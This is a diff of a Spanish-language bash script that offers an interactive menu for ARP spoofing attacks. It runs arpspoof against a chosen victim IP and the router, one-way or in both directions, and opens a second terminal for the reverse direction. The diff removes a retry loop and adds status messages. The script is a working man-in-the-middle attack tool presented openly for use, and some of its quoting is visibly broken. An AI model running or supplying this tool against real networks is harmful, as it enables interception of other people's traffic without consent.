@@ -6,7 +6,7 @@ trap ctrl_c INT
 ctrl_c() {
     echo
     echo "Saliendo..."
-    exit 0
+    exit 1
 }
 
 ip="$(hostname -I | awk '{print $1}')"
@@ -51,64 +51,70 @@ read -p "ingrese la interfaz de red a usar  (1-por defecto en tu sistema:$interf
         interfaz_red="$interfaz_red_defecto"
     fi
 router="${ip%.*}.1"
-while true; do
-    echo "como desea el ataque:"
-    echo "1- unidireccional (ataque en la comunicacion entre la victima y el router)"
-    echo "2- bidireccional (ataque en la comunicacion entre la victima y el router y biceversa al mismo tiempo, se abriran dos terminales)"
-    echo "(para pararlo presione CTRL+C)"
-    read -p ":" direcciones
-    if [[ $direcciones == "1" ]]; then
-        echo "Iniciando ataque unidireccional..."
-        sudo arpspoof -i $interfaz_red -t $ip_objetivo $router
-    elif [[ $direcciones == "2" ]]; then
-        echo "¿cual es su interfaz grafica?"
-        echo "1- GNOME"
-        echo "2- XFCE"
-        echo "3- KDE"
-        echo "4- MATE"
-        echo "5- LXDE"
-        echo "6- LXqt"
-        echo "7- Terminator"
-        echo "8- Deepin Terminal"
-        echo "9- Otro / Ninguno"
-        read -p ":" interfaz_grafica
-        inverso="sudo arpspoof -i $interfaz_red -t $router $ip_objetivo"
-        directo="sudo arpspoof -i $interfaz_red -t $ip_objetivo $router"
-        if [[ $interfaz_grafica == "1" ]]; then
-            gnome-terminal -- bash -c "$inverso; exec bash"" &
-            $directo
-        elif [[ $interfaz_grafica == "2" ]]; then
-            xfce4-terminal --command "bash -c '$inverso; exec bash'"" &
-            $directo
-        elif [[ $interfaz_grafica == "3" ]]; then
-            konsole -e bash -c "$inverso; exec bash" &
-            $directo
-        elif [[ $interfaz_grafica == "4" ]]; then
-            mate-terminal -- bash -c "$inverso; exec bash" &
-            $directo
-        elif [[ $interfaz_grafica == "5" ]]; then
-            lxterminal -e "bash -c '$inverso;; exec bash'" &
-            $directo
-        elif [[ $interfaz_grafica == "6" ]]; then
-            qterminal -e "bash -c '$inverso;; exec bash'" &
-            $directo
-        elif [[ $interfaz_grafica == "7" ]]; then
-            terminator -x bash -c "$inverso;; exec bash" &
-            $directo
-        elif [[ $interfaz_grafica == "8" ]]; then
-            deepin-terminal -e "bash -c '$inverso;; exec bash'" &
-            $directo
-        elif [[ $interfaz_grafica == "9" ]]; then
-            echo "Por favor, si tiene interfaz grafica abra una nueva terminal y ejecute el siguiente comando:"
-            echo "$inverso"
-            echo "Presione ENTER para continuar con el ataque directo..."
-            read -p ""
-            $directo
-        else
-            echo "Opción no válida. Saliendo."
-            exit 1
-        fi
+echo "como desea el ataque:"
+echo "1- unidireccional (ataque en la comunicacion entre la victima y el router)"
+echo "2- bidireccional (ataque en la comunicacion entre la victima y el router y biceversa al mismo tiempo, se habriran dos terminales para pararlo presione CTRL+C en ambas)"
+read -p ":" direcciones
+if [[ $direcciones == "1" ]]; then
+    echo "Iniciando ataque unidireccional..."
+    sudo arpspoof -i $interfaz_red -t $ip_objetivo $router
+elif [[ $direcciones == "2" ]]; then
+    echo "¿cual es su interfaz grafica?"
+    echo "1- GNOME"
+    echo "2- XFCE"
+    echo "3- KDE"
+    echo "4- MATE"
+    echo "5- LXDE"
+    echo "6- LXqt"
+    echo "7- Terminator"
+    echo "8- Deepin Terminal"
+    echo "9- Otro / Ninguno"
+    read -p ":" interfaz_grafica
+    inverso="sudo arpspoof -i $interfaz_red -t $router $ip_objetivo"
+    directo="sudo arpspoof -i $interfaz_red -t $ip_objetivo $router"
+    if [[ $interfaz_grafica == "1" ]]; then
+        echo "Iniciando ataque bidireccional..."
+        gnome-terminal -- bash -c "$inverso; exec bash"" &
+        $directo
+    elif [[ $interfaz_grafica == "2" ]]; then
+        echo "Iniciando ataque bidireccional..."
+        xfce4-terminal --command "bash -c '$inverso; exec bash'"" &
+        $directo
+    elif [[ $interfaz_grafica == "3" ]]; then
+        echo "Iniciando ataque bidireccional..."
+        konsole -e bash -c "$inverso; exec bash" &
+        $directo
+    elif [[ $interfaz_grafica == "4" ]]; then
+        echo "Iniciando ataque bidireccional..."
+        mate-terminal -- bash -c "$inverso; exec bash" &
+        $directo
+    elif [[ $interfaz_grafica == "5" ]]; then
+        echo "Iniciando ataque bidireccional..."
+        lxterminal -e "bash -c '$inverso;; exec bash'" &
+        $directo
+    elif [[ $interfaz_grafica == "6" ]]; then
+        echo "Iniciando ataque bidireccional..."
+        qterminal -e "bash -c '$inverso;; exec bash'" &
+        $directo
+    elif [[ $interfaz_grafica == "7" ]]; then
+        echo "Iniciando ataque bidireccional..."
+        terminator -x bash -c "$inverso;; exec bash" &
+        $directo
+    elif [[ $interfaz_grafica == "8" ]]; then
+        echo "Iniciando ataque bidireccional..."
+        deepin-terminal -e "bash -c '$inverso;; exec bash'" &
+        $directo
+    elif [[ $interfaz_grafica == "9" ]]; then
+        echo "Por favor, si tiene interfaz grafica abra una nueva terminal y ejecute el siguiente comando:"
+        echo "$inverso"
+        echo "Presione ENTER para continuar con el ataque directo..."
+        read -p ""
+        $directo
     else
-        echo "Opción no válida. Intente de nuevo."
+        echo "Opción no válida. Saliendo."
+        exit 1
     fi
-done
+else
+    echo "Opción no válida. Saliendo."
+    exit 1
+fi
